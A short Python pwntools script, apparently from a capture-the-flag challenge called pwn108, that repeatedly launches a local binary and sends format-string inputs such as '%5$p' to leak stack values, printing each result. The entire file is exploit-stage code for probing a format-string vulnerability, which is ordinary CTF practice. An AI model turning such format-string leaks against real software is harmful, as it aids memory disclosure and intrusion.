from pwn import *
import time

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./pwn108-1644300489260.pwn108', checksec=False)

# Create process (level used to reduce noise)
p = process(level='debug')

# Let's fuzz x values
for i in range(1,100):
    try:
        p = process(level='error')
        # Format the counter
        # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
        a = p.recvuntil(b':')
        #time.sleep(1)
        p.sendline(b'bas')
        #time.sleep(1)
        # Receive the response
        b = (p.recvuntil(b':'))
        #p.sendline('AAAA%{}$x'.format(i).encode())
        p.sendline('%{}$p'.format(i).encode())
        c = (p.recvuntil(b'Register no  :'))
        result = p.recvline().decode()
        # print(p.recvuntil(b':'))
        # result = p.recvline().decode()
        # If the item from the stack isn't empty, print it
        if result:
            print(str(i) + ': ' + str(result).strip())
    except EOFError:
        pass
